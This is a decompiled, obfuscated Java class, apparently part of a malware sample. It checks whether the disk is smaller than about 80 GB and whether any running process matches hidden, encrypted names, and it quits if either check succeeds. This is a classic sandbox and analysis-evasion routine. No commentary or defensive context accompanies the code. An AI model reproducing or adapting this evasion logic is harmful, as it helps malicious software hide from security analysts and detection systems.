/*
 * Decompiled with CFR 0.150.
 */
package agent.human;

import agent.human.K;
import agent.human.Main;
import java.io.File;
import java.util.ArrayList;

public class m {
    public static void c() {
        ProcessHandle.allProcesses().forEach(a -> m.c(a));
    }

    public static void ALLATORIxDEMO() {
        if (new File(K.ALLATORIxDEMO("M")).getTotalSpace() < 0x1400000000L) {
            System.exit(-1);
        }
    }

    public m() {
        m a;
    }

    public static void c(ProcessHandle a) {
        Object object = new ArrayList<String>();
        ((ArrayList)object).add(K.ALLATORIxDEMO("\u0014`\u0016b\ra\u0011"));
        ((ArrayList)object).add(Main.ALLATORIxDEMO("\u0010F\u0011J\u0014N"));
        ((ArrayList)object).add(K.ALLATORIxDEMO("{\u0000b\u001a"));
        ((ArrayList)object).add(Main.ALLATORIxDEMO("\u0010B\u0014_\u0013J\nI\tS"));
        if (!a.isAlive()) {
            return;
        }
        String string = a.info().command().toString();
        object = ((ArrayList)object).iterator();
        while (object.hasNext()) {
            String string2 = (String)object.next();
            if (!string.toLowerCase().contains(string2)) continue;
            System.exit(-1);
        }
    }
}